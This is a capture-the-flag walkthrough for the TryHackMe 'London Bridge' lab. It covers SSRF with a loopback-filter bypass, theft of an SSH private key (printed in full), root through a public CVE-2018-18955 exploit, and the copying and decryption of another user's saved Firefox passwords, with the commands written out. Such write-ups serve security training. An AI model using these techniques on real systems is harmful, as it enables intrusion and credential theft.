---
title: "TryHackMe - The London Bridge Walkthrough"
categories: [Writeups]
tags: [Writeups, TryHackMe]
image:
  path: assets/img/posts/tryhackme/the-london-bridge/618b3fa52f0acc0061fb0172-1718657342624.png
---

![image.png](assets/img/posts/tryhackme/the-london-bridge/image.png)

## Introduction

**Target IP:** `10.67.142.188`

**Difficulty:** Medium

This machine exposes a vulnerable web application that allows SSRF-based local file access, leading to SSH key disclosure and a local privilege escalation to root.

## Port Enumeration

Initial enumeration was performed using `nmap` to identify exposed services:

```bash
nmap 10.67.142.188 -p- -sT -vvv -T
```

**Results**

```bash
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack
8080/tcp open  http-proxy syn-ack
```

The attack surface is primarily the web service running on port **8080**.

## Web Page

Accessing `http://10.67.142.188:8080` reveals a simple website with multiple tabs.

![image.png](assets/img/posts/tryhackme/the-london-bridge/image%201.png)

**Notable Pages**

- **Contact** — message submission form
- **Gallery** — image upload functionality

Static tabs (`Home` and others ) do not have functionality.

The `Gallery` page allows image uploads

![image.png](assets/img/posts/tryhackme/the-london-bridge/image%202.png)

Analyzing the web page source code we can see that the photos are located in the `upload` dir 

![image.png](assets/img/posts/tryhackme/the-london-bridge/image%203.png)

We also have a note to the dev team to make sure that people can also add images using links

![image.png](assets/img/posts/tryhackme/the-london-bridge/image%204.png)

Attempts to upload a web shell failed due to strict image validation:

> *“Uploaded file is not an image”*
> 

Multiple bypass attempts (polyglots, MIME spoofing) were unsuccessful.

## Directory Enumeration

With upload attacks failing, directory enumeration was performed:

```bash
gobuster dir -u http://10.67.142.188:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Results**

```
/contact              (Status: 200) [Size: 1703]
/feedback             (Status: 405) [Size: 178]
/gallery              (Status: 200) [Size: 1876]
/upload               (Status: 405) [Size: 178]
/dejaview             (Status: 200) [Size: 823]
```

The `/dejaview` endpoint stands out.

## SSRF Discovery

The `/dejaview` page allows users to submit a URL that is rendered via an `<img>` tag.

![image.png](assets/img/posts/tryhackme/the-london-bridge/image%205.png)

Initial testing confirmed the use of the parameter:

```bash
image_url=<URL>
```

![image.png](assets/img/posts/tryhackme/the-london-bridge/image%206.png)

However, this only reflected content and did not allow directory listing or file access.

## Parameter Fuzzing

Based on the hint:

<aside>
⚠️

Check for other parameters that may been left over during the development phase. If one list doesn't work, try another common one.

</aside>

Parameter fuzzing was conducted:

```
ffuf -u 'http://10.67.142.188:8080/view_image' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'FUZZ=http://10.67.142.188/test' -mc all -t 50 -ic -fs 823
```

**Results**

A hidden parameter named `www` was discovered.

![image.png](assets/img/posts/tryhackme/the-london-bridge/image%207.png)

I found that `www` was a parameter that was accepted 

## SSRF Exploitation

To verify SSRF behavior, a request to the localhost interface was attempted using the discovered `www` parameter.

```bash
www=http://127.0.0.1/
```

![image.png](assets/img/posts/tryhackme/the-london-bridge/image%208.png)

This resulted in a **permission denied** response, indicating that direct access to `127.0.0.1` was likely filtered by the application

### **Filter Bypass**

To bypass this restriction, an alternative loopback representation was tested:

```bash
www=http://127.1/
```

This request returned a **valid response**, confirming that the application did not properly normalize or validate loopback IP addresses. 

![image.png](assets/img/posts/tryhackme/the-london-bridge/image%209.png)

### Internal Directory Fuzzing

Since Local File Inclusion (LFI) attempts were unsuccessful, I proceeded to further enumerate internal directories via the SSRF vector:

```
ffuf -u 'http://10.67.142.188:8080/view_image' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'www=http://127.1/FUZZ' -mc all -t 50 -ic -fs 469
```

This revealed sensitive directories, including `/.ssh`

![image.png](assets/img/posts/tryhackme/the-london-bridge/image%2010.png)

### SSH Key Disclosure

Checking `http://127.1/.ssh`, we see that indexing is enabled and there are two files.

![image.png](assets/img/posts/tryhackme/the-london-bridge/image%2011.png)

Reading `http://127.1/.ssh/id_rsa`, we obtain a private key.

```bash
curl -s 'http://10.67.142.188:8080/view_image' -d 'www=http://127.1/.ssh/id_rsa'      
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAz1yFrg9FAZAI4R37aQWn/ePTk/MKfz2KQ+OE45KErguL34Yj
5Kc1VJjDTTNRmc+vNRZieC8EwelWgpwcKACa70Ke2q/7zRLWHh23OUxWiSAAORTe
a1s5eus3ghTWjcfONROAkEg7O3XsNwgp93UUB8wbU+ADpZnFLPUDErFKoSp+dxG4
rxwqpAp6maqsE4dIZHdAq+Yt6/2HOERKrFWiONQpd6ZA8a325oWXY8UaREvKTuXc
jlL56t4iWQzsRQbBvB+ETg2ma01u/HmW3M9SyroPypcEOqvPnuPpqXHZu7BwALM5
NHhXCNmt+0EOBYKvejsDA6NeZfJgw65NVK+2hQIDAQABAoIBACJyZUaoBLegvMjg
2S32IZUcrr4qJrlCeOCUQDQp196tzlughf/rAwH9qpv9hXW+uYVhJZR/gxPPdm6W
Dlta1mIeuBLuHy9PDMDOAO0E0G9RIJha7iP5cJAJ2RvD6Gx/H7NTfQz64tQa39W4
hng0O9KbxoJleVWeONIiFZOaXiJthuro/d9GSivMBJyT8PR3JG6G+R4Qq1tAJqEU
Hx5DY/U7qVYQ1TE3EfbDR5y0+972fW7J0oZxOuwK6IWP9TtHcPPVIGweaIgZFys3
3ZFEzON5qRhNdV8lc127cUX5R5hFjn14GHJLpvbjkt8D9DggUKKNR8zPJfIGO5Tp
gdzclmECgYEA+kaVi0hq1sYSdZL4wHxDQJfGooPn8Hae8zFrsYjrVD8nOQ9NEz4N
XKqlGMhPc8P0PvuoKy1341ty966S8J+dKfdPzRURFzB84wy3A6CDnViRpCYwKFo0
Aa5wwpWZalBBpEis0h3YKCKVKyhs4/uN6lMw5H3GaCMdqqm00l9DRm0CgYEA1Bqq
e2pPYVCwyQb20/8aP305wu6Bdp+i3dUqkHndhPXmEL8EnXbEJuBymn7aKQ3Ln/zX
8G/7Mze845g93KAPFLeeNk/AmzXKnWB8mgcrFzxAD/wAxH1J9otLvhmX7BRVE6X/
0he6g1mdtNMXbt0B/aMOS+dCsMW1C/7oUfbxAXkCgYAlCvVvXBSUHVT2Gf6/XqUF
lnFL9IIL0ULNc+8go8dQ/NftVhpuUqzfnlI5TMyVsdcgy1akrWIlQI/PoQMWokk8
wOIK1Kdm60JQyLz9yHAyhb1osk5GarNv3EXMRyAh4CcXDbqmjsxDhHrXnHAhfkYO
/Kkr6IHJQAlQDTY6POdUMQKBgQCPPkMMfkuFyVzbJtzjZ1Futz+fKjw8xKrVbfUF
BYhZF0h83sRbI65tIv/C3xCu0SZHshaTxsy7VlU2z8ZXjbEhqLAstce6CqX/iv4b
d+PeGU6afPJ3wLWGz6Qjil1Tjpe2YVFXrbbEpm0fhcA5mwCRLuGk2VXs1Fjk9Q4o
7MDu4QKBgFIomwhD+jmr3Vc2HutYkl3zliSD239sH3k118sTHbedvKH5Q7nw0C+U
a7RMp/cXWZKdyRgFxQ7DQEorzWi5bLAyxXnMg0ghwWdf4nugQmaEG7t+OYUNsf7M
fDLzMA915WcODR6L0mWO0crAMbZQOkg1KlAiwQSQmuUpPqyAfq6x
-----END RSA PRIVATE KEY-----
```

Reading `http://127.1/.ssh/authorized_keys`, we find the username `beth`

```bash
curl -s 'http://10.67.142.188:8080/view_image' -d 'www=http://127.1/.ssh/authorized_keys'
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPXIWuD0UBkAjhHftpBaf949OT8wp/PYpD44TjkoSuC4vfhiPkpzVUmMNNM1GZz681FmJ4LwTB6VaCnBwoAJrvQp7ar/vNEtYeHbc5TFaJIAA5FN5rWzl66zeCFNaNx841E4CQSDs7dew3CCn3dRQHzBtT4AOlmcUs9QMSsUqhKn53EbivHCqkCnqZqqwTh0hkd0Cr5i3r/Yc4REqsVaI41Cl3pkDxrfbmhZdjxRpES8pO5dyOUvnq3iJZDOxFBsG8H4RODaZrTW78eZbcz1LKug/KlwQ6q8+e4+mpcdm7sHAAszk0eFcI2a37QQ4Fgq96OwMDo15l8mDDrk1Ur7aF beth@london
```

## SSH Access

Using the extracted private key, SSH access was obtained as the user `beth`:

```bash
chmod 600 key
ssh -i key beth@10.67.142.188
```

Successful login was confirmed:

```bash
beth@london:~$ id
uid=1000(beth) gid=1000(beth) groups=1000(beth)
```

Basic enumeration revealed the presence of another local user, `charles`, though no direct access to this account was available.

## Privilege Escalation

Local enumeration was performed using **LinPEAS**, which identified a privilege escalation vector related to **CVE-2018-18955** involving misconfigured subordinate UID mappings (`subuid_shell`).

![image.png](assets/img/posts/tryhackme/the-london-bridge/image%2012.png)

[https://github.com/scheatkode/CVE-2018-18955](https://github.com/scheatkode/CVE-2018-18955)

The following exploit components were downloaded from GitHub, compiled, and transferred to the target machine:

- `exploit.dbus.sh`
- `subuid_shell.c`
- `subshell.c`
- `rootshell.c`

Executing the exploit:

```bash
beth@london:~$ bash exploit.dbus.sh
```

The exploit successfully created a SUID root shell:

```bash
beth@london:~$ bash exploit.dbus.sh
[*] Compiling...
[*] Creating /usr/share/dbus-1/system-services/org.subuid.Service.service...
[.] starting
[.] setting up namespace
[~] done, namespace sandbox set up
[.] mapping subordinate ids
[.] subuid: 100000
[.] subgid: 100000
[~] done, mapped subordinate ids
[.] executing subshell
[*] Creating /etc/dbus-1/system.d/org.subuid.Service.conf...
[.] starting
[.] setting up namespace
[~] done, namespace sandbox set up
[.] mapping subordinate ids
[.] subuid: 100000
[.] subgid: 100000
[~] done, mapped subordinate ids
[.] executing subshell
[*] Launching dbus service...
Error org.freedesktop.DBus.Error.NoReply: Did not receive a reply. Possible causes include: the remote application did not send a reply, the message bus security policy blocked the reply, the reply timeout expired, or the network connection was broken.
[+] Success:
-rwsrwxr-x 1 root root 8392 Feb  3 16:31 /tmp/sh
[*] Cleaning up...
[*] Launching root shell: /tmp/sh
root@london:~# 
```

Root access was confirmed:

```bash
root@london:~# id
uid=0(root) gid=0(root) groups=0(root),1000(beth)
```

With full privileges obtained, analyzed the root directory:

```bash
root@london:/root# ls -la
total 52
drwx------  6 root root 4096 Apr 23  2024 .
drwxr-xr-x 23 root root 4096 Apr  7  2024 ..
lrwxrwxrwx  1 root root    9 Sep 18  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  3 root root 4096 Apr 23  2024 .cache
-rw-r--r--  1 beth beth 2246 Mar 16  2024 flag.py
-rw-r--r--  1 beth beth 2481 Mar 16  2024 flag.pyc
drwx------  3 root root 4096 Apr 23  2024 .gnupg
drwxr-xr-x  3 root root 4096 Sep 16  2023 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwxr-xr-x  2 root root 4096 Mar 16  2024 __pycache__
-rw-rw-r--  1 root root   27 Sep 18  2023 .root.txt
-rw-r--r--  1 root root   66 Mar 10  2024 .selected_editor
-rw-r--r--  1 beth beth  175 Mar 16  2024 test.py
```

Found the password:

```bash
root@london:/root# cat .root.txt
THM{REDACTED}
```

## Charles’s Password

The final objective of the room is to recover the password for the user `charles`.

After obtaining root access, the home directory of `charles` was inspected. A `.mozilla` directory was present, indicating a Firefox profile that may contain saved credentials.

```bash
root@london:/home/charles# ls -la
total 24
drw------- 3 charles charles 4096 Apr 23  2024 .
drwxr-xr-x 4 root    root    4096 Mar 10  2024 ..
lrwxrwxrwx 1 root    root       9 Apr 23  2024 .bash_history -> /dev/null
-rw------- 1 charles charles  220 Mar 10  2024 .bash_logout
-rw------- 1 charles charles 3771 Mar 10  2024 .bashrc
drw------- 3 charles charles 4096 Feb  4 12:37 .mozilla
-rw------- 1 charles charles  807 Mar 10  2024 .profile
```

### **Firefox Profile Extraction**

Inside `.mozilla`, a Firefox profile directory was found:

```bash
root@london:/home/charles/.mozilla# ls -la
total 12
drw------- 3 charles charles 4096 Feb  4 12:39 .
drw------- 3 charles charles 4096 Apr 23  2024 ..
drw------- 3 charles charles 4096 Feb  4 12:37 firefox
```

Since Firefox can store saved credentials locally, the profile directory was archived for offline analysis:

```bash
root@london:/home/charles/.mozilla# tar -cvzf /tmp/firefox.tar.gz firefox
```

The archive was then transferred to the attacker machine:

```bash
$ scp -i key beth@10.67.142.188:/tmp/firefox.tar.gz .
```

### Credential Decryption

After extracting the archive locally:

```bash
tar -xvzf firefox.tar.gz
```

The Firefox credentials were decrypted using `firefox_decrypt.py`:

```bash
$ python3 firefox_decrypt.py firefox/8k3bf3zp.charles
```

**Results**

```abap
Website:   https://www.buckinghampalace.com
Username: 'Charles'
Password: '[REDACTED]'
```

This revealed the password for the `charles` user, completing the final objective of the room.
